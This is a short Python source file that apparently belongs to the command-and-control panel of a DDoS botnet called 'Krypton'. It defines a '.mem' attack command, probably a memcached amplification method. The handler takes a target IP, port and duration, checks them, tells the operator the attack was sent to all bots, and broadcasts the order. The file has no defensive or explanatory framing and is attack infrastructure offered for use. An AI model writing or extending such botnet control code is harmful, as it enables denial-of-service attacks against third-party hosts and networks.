from colorama import Fore

def mem(args, validate_ip, validate_port, validate_time, send, client, ansi_clear, broadcast, data):
    if len(args) == 4:
        ip = args[1]
        port = args[2]
        secs = args[3]
        if validate_ip(ip):
            if validate_port(port):
                if validate_time(secs):
                    send(client, f"{Fore.LIGHTWHITE_EX}\nAttack successfully sent to all {Fore.LIGHTBLACK_EX}Krypton {Fore.LIGHTWHITE_EX}Bots!\n")
                    broadcast(data)
                else:
                    send(client, Fore.RED + '\nInvalid attack duration (10-1300 seconds)\n')
            else:
                send(client, Fore.RED + '\nInvalid port number (1-65535)\n')
        else:
            send(client, Fore.RED + '\nInvalid IP-address\n')
    else:
        send(client, '\nUsage: .mem [IP] [PORT] [TIME]\n')